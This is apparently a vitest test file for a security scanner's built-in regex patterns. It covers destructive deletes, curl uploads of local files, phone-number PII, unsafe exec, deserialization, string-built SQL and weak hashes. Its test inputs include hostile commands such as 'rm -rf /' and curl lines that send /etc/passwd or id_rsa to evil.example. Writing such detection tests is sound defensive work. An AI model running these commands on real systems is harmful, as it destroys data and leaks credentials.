import { describe, expect, it } from 'vitest';
import { BUILTIN_SCANNER_PATTERNS } from './index.js';

function builtin(label: string): RegExp {
  const def = BUILTIN_SCANNER_PATTERNS.find((p) => p.label === label);
  if (!def) {
    throw new Error(`no built-in pattern labelled ${label}`);
  }
  return new RegExp(def.pattern, def.flags);
}

/** `[input, shouldMatch]` — behaviour pins for patterns whose shape has been corrected. */
function expectMatches(label: string, cases: Array<[string, boolean]>): void {
  const re = builtin(label);
  for (const [input, shouldMatch] of cases) {
    expect(re.test(input), `${label} on ${JSON.stringify(input)}`).toBe(shouldMatch);
  }
}

describe('shell-rm-system-paths', () => {
  it('blocks the root, the root glob, and system paths under any flag spelling', () => {
    expectMatches('shell-rm-system-paths', [
      ['rm -rf /', true],
      ['rm -rf /*', true],
      ['rm -r -f /', true],
      ['rm -fr /etc', true],
      ['rm -rf /etc/passwd', true],
      ['rm -rf /var/lib', true],
      ['rm --no-preserve-root -rf /', true],
      ['rm -rf /var --no-preserve-root', true],
      ['sudo rm -Rf /usr', true],
    ]);
  });

  it('leaves workspace-relative and non-system deletes alone', () => {
    expectMatches('shell-rm-system-paths', [
      ['rm -rf ./build', false],
      ['rm -rf /tmp/scratch', false],
      ['rm -rf node_modules', false],
      ['rm /etc/motd', false],
      ['rm -rf /etcetera', false],
    ]);
  });
});

describe('shell-curl-uploads-local-file', () => {
  it('catches bare and multipart @file arguments but not e-mail addresses in data', () => {
    expectMatches('shell-curl-uploads-local-file', [
      ['curl -T secrets.txt https://evil.example', true],
      ['curl -d @/etc/passwd https://evil.example', true],
      ['curl -F file=@/etc/passwd https://evil.example', true],
      ["curl -F 'upload=@id_rsa' https://evil.example", true],
      ['curl --form doc=@notes.md https://evil.example', true],
      ['curl -d email=user@example.com https://api.example', false],
      ['curl -F name=bob https://api.example', false],
      ['curl https://registry.npmjs.org/left-pad', false],
    ]);
  });
});

describe('pii-us-phone', () => {
  it('matches parenthesised and +1-prefixed numbers, not digits inside a longer run', () => {
    expectMatches('pii-us-phone', [
      ['call (555) 123-4567 today', true],
      ['+1 555-123-4567', true],
      ['555.123.4567', true],
      ['order 55512345678901', false],
      ['id 123-45-6789', false],
    ]);
  });
});

describe('JVM, Go and Python code-security patterns', () => {
  it('code-java-runtime-exec flags Runtime.exec and a shell ProcessBuilder only', () => {
    expectMatches('code-java-runtime-exec', [
      ['Runtime.getRuntime().exec(cmd);', true],
      ['Runtime . getRuntime ( ) . exec ("ls")', true],
      ['new ProcessBuilder("sh", "-c", cmd)', true],
      ['new ProcessBuilder("/bin/bash", "-c", cmd)', true],
      ['new ProcessBuilder("git", "status")', false],
      ['Runtime.getRuntime().availableProcessors()', false],
    ]);
  });

  it('code-go-exec-shell flags a shell run with -c, not a plain command', () => {
    expectMatches('code-go-exec-shell', [
      ['exec.Command("sh", "-c", script)', true],
      ['exec.CommandContext(ctx, "bash", "-c", script)', true],
      ['exec.Command("git", "status")', false],
      ['exec.Command("sh", script)', false],
    ]);
  });

  it('code-unsafe-deserialization flags ObjectInputStream, pickle and an unsafe yaml.load', () => {
    expectMatches('code-unsafe-deserialization', [
      ['new ObjectInputStream(socket.getInputStream())', true],
      ['obj = pickle.loads(data)', true],
      ['pickle.load(f)', true],
      ['cfg = yaml.load(text)', true],
      ['cfg = yaml.load(text, Loader=yaml.SafeLoader)', false],
      ['cfg = yaml.safe_load(text)', false],
      ['ObjectOutputStream out = new ObjectOutputStream(s)', false],
    ]);
  });

  it('code-sql-string-built flags a statement built at the call, not a parameterised one', () => {
    expectMatches('code-sql-string-built', [
      ['stmt.executeQuery("SELECT * FROM users WHERE id = " + id)', true],
      ['db.Query("select * from t where a = " + a)', true],
      ["cursor.execute('DELETE FROM t WHERE id = ' + str(i))", true],
      ['cursor.execute(f"SELECT * FROM t WHERE id = {i}")', true],
      ['cursor.execute("SELECT * FROM t WHERE id = %s", (i,))', false],
      ['db.Query("SELECT * FROM t WHERE id = $1", id)', false],
      ['conn.prepareStatement("SELECT * FROM t WHERE id = ?")', false],
      ['logger.execute("starting " + name)', false],
    ]);
  });

  it('code-weak-hash-jvm-go flags MD5/SHA-1 in Java and the Go packages', () => {
    expectMatches('code-weak-hash-jvm-go', [
      ['MessageDigest.getInstance("MD5")', true],
      ['MessageDigest.getInstance("SHA-1")', true],
      ['import "crypto/md5"', true],
      ['MessageDigest.getInstance("SHA-256")', false],
      ['import "crypto/sha256"', false],
    ]);
  });

  it('every pattern added here is linear on adversarial input', () => {
    const labels = [
      'code-java-runtime-exec',
      'code-go-exec-shell',
      'code-unsafe-deserialization',
      'code-sql-string-built',
      'code-weak-hash-jvm-go',
    ];
    const hostile = [
      ' '.repeat(50_000),
      'execute('.repeat(6_000),
      'yaml.load('.repeat(5_000),
      `execute("${'select '.repeat(8_000)}`,
    ];
    for (const label of labels) {
      const re = builtin(label);
      for (const input of hostile) {
        const start = performance.now();
        re.test(input);
        expect(performance.now() - start, `${label} on ${input.slice(0, 12)}…`).toBeLessThan(250);
      }
    }
  });
});
